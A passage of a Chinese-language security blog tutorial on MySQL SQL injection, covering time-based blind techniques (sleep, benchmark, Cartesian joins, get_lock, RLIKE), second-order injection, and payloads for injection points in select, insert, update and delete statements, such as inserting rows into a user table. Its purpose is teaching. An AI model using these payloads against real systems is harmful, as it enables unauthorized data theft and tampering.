<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> id <span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (if(substr(database(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;u&#x27;</span>,sleep(<span class="number">3</span>),<span class="keyword">null</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> id <span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (if(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">100</span>,sleep(<span class="number">3</span>),<span class="keyword">null</span>));</span><br></pre></td></tr></table></figure>



<h4 id="基于时间延时的盲注：benchmark"><a href="#基于时间延时的盲注：benchmark" class="headerlink" title="基于时间延时的盲注：benchmark"></a>基于时间延时的盲注：benchmark</h4><p>除了sleep之外的时间延时注入，还有BENCHMARK(count,expr)</p>
<p>BENCHMARK()函数重复count次执行表达式expr。它可以被用于计算MySQL处理表达式的速度。结果通常为0</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> benchmark(<span class="number">10000000</span>,sha(<span class="number">1</span>));</span><br></pre></td></tr></table></figure>



<h4 id="基于时间延时的盲注：笛卡尔积"><a href="#基于时间延时的盲注：笛卡尔积" class="headerlink" title="基于时间延时的盲注：笛卡尔积"></a>基于时间延时的盲注：笛卡尔积</h4><p>除了sleep之外的时间延时注入，还有笛卡尔积</p>
<blockquote>
<p>笛卡尔乘积是指在数学中，两个<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E9%9B%86%E5%90%88?fromModule=lemma_inlink">集合</a><em>X</em>和<em>Y</em>的笛卡尔积（Cartesian product），又称<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E7%9B%B4%E7%A7%AF?fromModule=lemma_inlink">直积</a>，表示为<em>X</em>×<em>Y</em>，第一个对象是<em>X</em>的成员而第二个对象是<em>Y</em>的所有可能<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%9C%89%E5%BA%8F%E5%AF%B9?fromModule=lemma_inlink">有序对</a>的其中一个成员 [3] 。</p>
<p>假设集合A&#x3D;{a, b}，集合B&#x3D;{0, 1, 2}，则两个集合的笛卡尔积为{(a, 0), (a, 1), (a, 2), (b, 0), (b, 1), (b, 2)}。</p>
<p>类似的例子有，如果A表示某学校学生的集合，B表示该学校所有课程的集合，则A与B的笛卡尔积表示所有可能的选课情况。A表示所有声母的集合，B表示所有韵母的集合，那么A和B的笛卡尔积就为所有可能的汉字全拼。</p>
<p>设A,B为集合，用A中元素为第一元素，B中元素为第二元素构成有序对，所有这样的有序对组成的集合叫做A与B的笛卡尔积，记作AxB.</p>
<p>笛卡尔积的符号化为：</p>
<p>A×B&#x3D;{(x,y)|x∈A∧y∈B}</p>
<p>例如，A&#x3D;{a,b}, B&#x3D;{0,1,2}，则</p>
<p>A×B&#x3D;{(a, 0), (a, 1), (a, 2), (b, 0), (b, 1), (b, 2)}</p>
<p>B×A&#x3D;{(0, a), (0, b), (1, a), (1, b), (2, a), (2, b)}</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">slect <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> <span class="keyword">user</span> A,<span class="keyword">user</span> B;</span><br></pre></td></tr></table></figure>



<h4 id="基于时间延时的盲注：get-lock"><a href="#基于时间延时的盲注：get-lock" class="headerlink" title="基于时间延时的盲注：get_lock()"></a>基于时间延时的盲注：get_lock()</h4><p>除了sleep之外的时间延时注入，还有：GET_LOCK(str,timeout)</p>
<p>说明：设法使用字符串str给定的名字得到一个锁，超时为timeout秒</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> get_lock(<span class="string">&#x27;a&#x27;</span>,<span class="number">10</span>);</span><br></pre></td></tr></table></figure>

<p>tip: 设置锁后需要重新开一个窗口并且是长连接才会有效</p>
<h4 id="基于时间延时的盲注：RLIKE"><a href="#基于时间延时的盲注：RLIKE" class="headerlink" title="基于时间延时的盲注：RLIKE"></a>基于时间延时的盲注：RLIKE</h4><p>除了sleep之外的时间延时注入，还有：RLIKE</p>
<p>通过rpad或repeat构造长字符串，加以计算量大的pattern，通过repeats的参数可以控制延时长短</p>
<h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>针对无法直接注入的情况，通过把sql语句注入到数据库中，当程序从数据库中拿出数据的时候，默认是安全的，这时候进行拼接的时候，就会出现二次注入的情况</p>
<h2 id="0x4-不同的注入点的对应技巧"><a href="#0x4-不同的注入点的对应技巧" class="headerlink" title="0x4 不同的注入点的对应技巧"></a>0x4 不同的注入点的对应技巧</h2><p>注入点拼接在sql语句的不同位置，sql注入的利用方式也不尽相同，这里我们研究不同位置下的sql注入</p>
<h3 id="select注入"><a href="#select注入" class="headerlink" title="select注入"></a>select注入</h3><p>附官方文档:<a target="_blank" rel="noopener" href="https://docs.oracle.com/cd/E17952_01/mysql-5.6-en/select.html">https://docs.oracle.com/cd/E17952_01/mysql-5.6-en/select.html</a></p>
<h4 id="注入点在select之后，from之前"><a href="#注入点在select之后，from之前" class="headerlink" title="注入点在select之后，from之前"></a>注入点在select之后，from之前</h4><p>可以通过<code>as</code>别名将数据直接覆盖带出,比如正常查询是这样的</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> <span class="keyword">user</span>;</span><br></pre></td></tr></table></figure>

<p>如果我们select之后位置可以控制注入，即select 注入点 from user;</p>
<p>我们就可以这样利用</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> (<span class="keyword">select</span> password) <span class="keyword">as</span> username <span class="keyword">from</span> <span class="keyword">user</span>;</span><br></pre></td></tr></table></figure>

<p><img src="https://zcystar-1313738303.cos.ap-beijing.myqcloud.com/202210192208285.png" alt="image-20221019220833245"></p>
<p>移花接木啦</p>
<h4 id="注入点在引用表"><a href="#注入点在引用表" class="headerlink" title="注入点在引用表"></a>注入点在引用表</h4><p>这里分两种情况,如果表名被反引号包裹,需要先闭合反引号,这时候我们可以子查询</p>
<p>正常情况为:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> title, content <span class="keyword">from</span> page;</span><br></pre></td></tr></table></figure>

<p>select title, content from 注入点;</p>
<p>加入子查询后:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> title <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">user</span>() <span class="keyword">as</span> title)b;</span><br><span class="line">#</span><br><span class="line"><span class="keyword">select</span> title,content <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">user</span>() <span class="keyword">as</span> title,<span class="string">&#x27;aaa&#x27;</span> <span class="keyword">as</span> content) <span class="keyword">as</span> b;</span><br></pre></td></tr></table></figure>

<p>这样就可以通过title列把user()数据带出</p>
<h4 id="注入点在where条件以后"><a href="#注入点在where条件以后" class="headerlink" title="注入点在where条件以后"></a>注入点在where条件以后</h4><p>正常情况为:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select title from page where id=1;</span><br></pre></td></tr></table></figure>

<p>这里我们可以使用union联合查询</p>
<h4 id="注入点在group-by或者order-by之后"><a href="#注入点在group-by或者order-by之后" class="headerlink" title="注入点在group by或者order by之后"></a>注入点在group by或者order by之后</h4><p>正常情况下为:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> id,title,content <span class="keyword">from</span> page <span class="keyword">order</span> <span class="keyword">by</span> 注入点;</span><br></pre></td></tr></table></figure>

<p>这里可以配合时间盲注</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> id,title,content <span class="keyword">from</span> page <span class="keyword">order</span> <span class="keyword">by</span> id ,if(substr((<span class="keyword">select</span> username <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id <span class="operator">=</span><span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;a&#x27;</span> ,sleep(<span class="number">1</span>),<span class="number">1</span>);</span><br></pre></td></tr></table></figure>



<h4 id="注入点在limit之后"><a href="#注入点在limit之后" class="headerlink" title="注入点在limit之后"></a>注入点在limit之后</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select id,title,content from page order by id limit 注入点;</span><br></pre></td></tr></table></figure>

<p>由于limit之后,只能是数字,可以使用<code>procedure analyse</code>语法来实现报错注入,<strong>但是这种方式只能是MySQL5.6以前使用</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> title,content <span class="keyword">from</span> page limit <span class="number">1</span> <span class="keyword">procedure</span> analyse(updatexml(<span class="number">1</span>,concat(<span class="number">0x3a</span>,version(),<span class="number">0x3a</span>),<span class="number">1</span>));</span><br></pre></td></tr></table></figure>



<h3 id="insert注入"><a href="#insert注入" class="headerlink" title="insert注入"></a>insert注入</h3><p>附官方文档：<a target="_blank" rel="noopener" href="https://docs.oracle.com/cd/E17952_01/mysql-5.6-en/insert.html">https://docs.oracle.com/cd/E17952_01/mysql-5.6-en/insert.html</a></p>
<h4 id="注入点在要插入的表名"><a href="#注入点在要插入的表名" class="headerlink" title="注入点在要插入的表名"></a>注入点在要插入的表名</h4><p>通过劫持要插入的表，可以增加文章，这时候也可以增加一个用户表数据进去</p>
<p>正常情况下这样：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> page (title,content) <span class="keyword">values</span>(&quot;page1&quot;,&quot;content1&quot;);</span><br></pre></td></tr></table></figure>

<p>当我们可以控制表名的时候</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> 注入点 (title,content) <span class="keyword">values</span>(&quot;page1&quot;,&quot;content1&quot;);</span><br></pre></td></tr></table></figure>

<p>就可以劫持插入</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">user</span>(username,password) <span class="keyword">values</span>(&quot;111&quot;,&quot;111&quot;);#(title,content) <span class="keyword">values</span>(&quot;page1&quot;,&quot;content1&quot;);</span><br></pre></td></tr></table></figure>



<h4 id="注入点在插入的值"><a href="#注入点在插入的值" class="headerlink" title="注入点在插入的值"></a>注入点在插入的值</h4><p>如果注入点在插入的值的位置。可以闭合括号后再次插入一条数据。原始sql预期为：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> page(title,content) <span class="keyword">values</span>(&quot;注入点&quot;,&quot;xxx&quot;);</span><br></pre></td></tr></table></figure>

<p>注入点在插入值时，我们可以：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> page(title,content) <span class="keyword">values</span>(&quot;123&quot;,&quot;123&quot;),(&quot;456&quot;,(<span class="keyword">select</span> <span class="keyword">user</span>()));#&quot;,&quot;xxx&quot;);</span><br></pre></td></tr></table></figure>



<h3 id="update注入"><a href="#update注入" class="headerlink" title="update注入"></a>update注入</h3><h4 id="注入点在set后边"><a href="#注入点在set后边" class="headerlink" title="注入点在set后边"></a>注入点在set后边</h4><p>和上面insert利用方法相似，可以通过修改多条数据实现数据回显</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> page <span class="keyword">set</span> title <span class="operator">=</span> &quot;注入点&quot; <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<p>我们可以通过这种方式注入</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> page <span class="keyword">set</span> title <span class="operator">=</span> &quot;123&quot;,content <span class="operator">=</span> (<span class="keyword">select</span> <span class="keyword">user</span>()) <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">5</span> ;#&quot; where id = 1;</span><br></pre></td></tr></table></figure>

<p>注入后,我们可以实现</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> page <span class="keyword">set</span> title <span class="operator">=</span> &quot;123&quot;, content <span class="operator">=</span> (<span class="keyword">select</span> <span class="keyword">user</span>()) <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">5</span>;</span><br></pre></td></tr></table></figure>



<h4 id="注入点在values后面"><a href="#注入点在values后面" class="headerlink" title="注入点在values后面"></a>注入点在values后面</h4><p>如果注入点在value中,我们同样可以闭合括号,实现多个记录的修改,类似于insert方法</p>
<h3 id="delete注入"><a href="#delete注入" class="headerlink" title="delete注入"></a>delete注入</h3><h4 id="注入点在where之后"><a href="#注入点在where之后" class="headerlink" title="注入点在where之后"></a>注入点在where之后</h4><p>这里如果不小心就会删除表内所有的数据,所以需要一个特别的技巧</p>
<p>由于<code>select sleep(1);</code>恒返回0,所以在delete注入时,要确保不会影响表数据,造成下次没办法利用,所以我可以在注入点后</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> page <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> sleep(<span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<p>确保不会真的删除表数据</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> page <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span> <span class="number">1</span> <span class="keyword">or</span> updatexml(<span class="number">1</span>, concat(<span class="number">0x7e</span>, database()), <span class="number">0</span>) <span class="keyword">and</span> sleep(<span class="number">1</span>);</span><br></pre></td></tr></table></figure>



<h4 id="注入点在表名中"><a href="#注入点在表名中" class="headerlink" title="注入点在表名中"></a>注入点在表名中</h4><p>可以使用报错注入回显数据,避免数据被删除。</p>
<h1 id="NO-3SQLMAP"><a href="#NO-3SQLMAP" class="headerlink" title="NO.3SQLMAP"></a>NO.3SQLMAP</h1></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://chronos.mc9g.cn">Chronos</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://chronos.mc9g.cn/web%E5%AE%89%E5%85%A8/SQL/blog(SQL)/">https://chronos.mc9g.cn/web%E5%AE%89%E5%85%A8/SQL/blog(SQL)/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://chronos.mc9g.cn" target="_blank">Chronos</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/SQL/">SQL</a></div><div class="post_share"><div class="social-share" data-image="https://zcystar-1313738303.cos.ap-beijing.myqcloud.com/9AE5EADB01D68AF6519D1AE140FE1372.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/Nmap/blog(Nmap)/"><img class="prev-cover" src="https://zcystar-1313738303.cos.ap-beijing.myqcloud.com/9AE5EADB01D68AF6519D1AE140FE1372.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Nmap用法</div></div></a></div><div class="next-post pull-right"><a href="/web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80/blog(php)/"><img class="next-cover" src="https://zcystar-1313738303.cos.ap-beijing.myqcloud.com/9AE5EADB01D68AF6519D1AE140FE1372.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">web基础</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://zcystar-1313738303.cos.ap-beijing.myqcloud.com/a.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Chronos</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">5</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#NO-1SQL%E5%9F%BA%E7%A1%80"><span class="toc-number">1.</span> <span class="toc-text">NO.1SQL基础</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x1-sql%E7%9A%84%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95"><span class="toc-number">1.1.</span> <span class="toc-text">0x1 sql的基本语法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-sql%E8%AF%AD%E8%A8%80%E7%9A%84%E4%BD%9C%E7%94%A8"><span class="toc-number">1.1.1.</span> <span class="toc-text">1 sql语言的作用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">1.1.2.</span> <span class="toc-text">2 数据库</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B3%E7%B3%BB%E5%9E%8B%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">1.1.2.1.</span> <span class="toc-text">关系型数据库</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9D%9E%E5%85%B3%E7%B3%BB%E5%9E%8B%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">1.1.2.2.</span> <span class="toc-text">非关系型数据库</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x2-php%E6%93%8D%E4%BD%9C%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">1.2.</span> <span class="toc-text">0x2 php操作数据库</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-php%E9%93%BE%E6%8E%A5mysql%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">1.2.1.</span> <span class="toc-text">1 php链接mysql数据库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E4%BD%BF%E7%94%A8php%E5%BB%BA%E7%AB%8B%E7%99%BB%E9%99%86%E7%95%8C%E9%9D%A2"><span class="toc-number">1.2.2.</span> <span class="toc-text">2 使用php建立登陆界面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%BB%BA%E7%AB%8B%E7%99%BB%E9%99%86%E9%AA%8C%E8%AF%81%E5%8A%9F%E8%83%BD"><span class="toc-number">1.2.3.</span> <span class="toc-text">3 建立登陆验证功能</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%A2%9E%E5%8A%A0%E6%96%87%E7%AB%A0%E5%BD%95%E5%85%A5%E5%8A%9F%E8%83%BD"><span class="toc-number">1.2.4.</span> <span class="toc-text">4 增加文章录入功能</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E6%98%BE%E7%A4%BA%E6%96%87%E7%AB%A0%E5%88%97%E8%A1%A8"><span class="toc-number">1.2.5.</span> <span class="toc-text">5 显示文章列表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E6%98%BE%E7%A4%BA%E6%96%87%E7%AB%A0%E8%AF%A6%E6%83%85"><span class="toc-number">1.2.6.</span> <span class="toc-text">6 显示文章详情</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E5%A2%9E%E5%8A%A0%E6%96%87%E7%AB%A0%E7%BC%96%E8%BE%91%E5%8A%9F%E8%83%BD"><span class="toc-number">1.2.7.</span> <span class="toc-text">7 增加文章编辑功能</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-%E5%A2%9E%E5%8A%A0%E5%88%A0%E9%99%A4%E5%8A%9F%E8%83%BD"><span class="toc-number">1.2.8.</span> <span class="toc-text">8 增加删除功能</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-%E5%A2%9E%E5%8A%A0%E9%93%BE%E6%8E%A5%EF%BC%8C%E6%8F%90%E5%8D%87%E5%8F%AF%E7%94%A8%E6%80%A7"><span class="toc-number">1.2.9.</span> <span class="toc-text">9 增加链接，提升可用性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-%E8%AE%BE%E7%BD%AE%E6%9D%83%E9%99%90"><span class="toc-number">1.2.10.</span> <span class="toc-text">10 设置权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#11-%E5%A2%9E%E5%8A%A0%E9%80%80%E5%87%BA%E5%8A%9F%E8%83%BD"><span class="toc-number">1.2.11.</span> <span class="toc-text">11 增加退出功能</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E8%AF%AD%E5%8F%A5"><span class="toc-number">1.2.12.</span> <span class="toc-text">SQL语句</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP%E8%AF%AD%E5%8F%A5"><span class="toc-number">1.2.13.</span> <span class="toc-text">PHP语句</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NO-2SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">NO.2SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x1sql%E6%B3%A8%E5%85%A5%E4%BA%A7%E7%94%9F"><span class="toc-number">2.1.</span> <span class="toc-text">0x1sql注入产生</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x2sql%E6%B3%A8%E5%85%A5%E7%9A%84%E5%8D%B1%E5%AE%B3"><span class="toc-number">2.2.</span> <span class="toc-text">0x2sql注入的危害</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x3sql%E6%B3%A8%E5%85%A5%E7%9A%84%E7%B1%BB%E5%9E%8B"><span class="toc-number">2.3.</span> <span class="toc-text">0x3sql注入的类型</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5%E5%92%8Cunion%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="toc-number">2.3.1.</span> <span class="toc-text">1 数字型注入和union联合注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">2.3.1.1.</span> <span class="toc-text">数字型注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#union%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="toc-number">2.3.1.2.</span> <span class="toc-text">union联合注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5%E5%92%8C%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">2.3.2.</span> <span class="toc-text">2 字符型注入和布尔盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">2.3.2.1.</span> <span class="toc-text">字符型注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">2.3.2.2.</span> <span class="toc-text">布尔盲注</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">2.3.3.</span> <span class="toc-text">3 报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#updatexml%E6%8A%A5%E9%94%99"><span class="toc-number">2.3.3.1.</span> <span class="toc-text">updatexml报错</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#floor%E6%8A%A5%E9%94%99"><span class="toc-number">2.3.3.2.</span> <span class="toc-text">floor报错</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%8A%A5%E9%94%99"><span class="toc-number">2.3.3.3.</span> <span class="toc-text">整数溢出报错</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp%E6%8A%A5%E9%94%99"><span class="toc-number">2.3.3.4.</span> <span class="toc-text">exp报错</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pow%E6%8A%A5%E9%94%99"><span class="toc-number">2.3.3.5.</span> <span class="toc-text">pow报错</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cot%E6%8A%A5%E9%94%99"><span class="toc-number">2.3.3.6.</span> <span class="toc-text">cot报错</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8D%E5%AD%98%E5%9C%A8%E7%9A%84%E5%87%BD%E6%95%B0%E6%8A%A5%E9%94%99"><span class="toc-number">2.3.3.7.</span> <span class="toc-text">不存在的函数报错</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-number">2.3.4.</span> <span class="toc-text">4 堆叠注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">2.3.5.</span> <span class="toc-text">5 时间盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E5%BB%B6%E6%97%B6%E7%9A%84%E7%9B%B2%E6%B3%A8%EF%BC%9ASLEEP"><span class="toc-number">2.3.5.1.</span> <span class="toc-text">基于时间延时的盲注：SLEEP</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%85%8D%E5%90%88if%E6%9D%A1%E4%BB%B6%E8%A7%A6%E5%8F%91"><span class="toc-number">2.3.5.1.1.</span> <span class="toc-text">配合if条件触发</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%86%8D%E7%94%A8%E4%B8%8A%E6%88%AA%E5%8F%96%E5%87%BD%E6%95%B0"><span class="toc-number">2.3.5.1.2.</span> <span class="toc-text">再用上截取函数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%85%8D%E5%90%88select-case-when%E6%9D%A1%E4%BB%B6%E8%A7%A6%E5%8F%91"><span class="toc-number">2.3.5.1.3.</span> <span class="toc-text">配合select case when条件触发</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E5%BB%B6%E6%97%B6%E7%9A%84%E7%9B%B2%E6%B3%A8%EF%BC%9A%E9%80%90%E5%AD%97%E6%B3%A8%E5%85%A5"><span class="toc-number">2.3.5.2.</span> <span class="toc-text">基于时间延时的盲注：逐字注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" 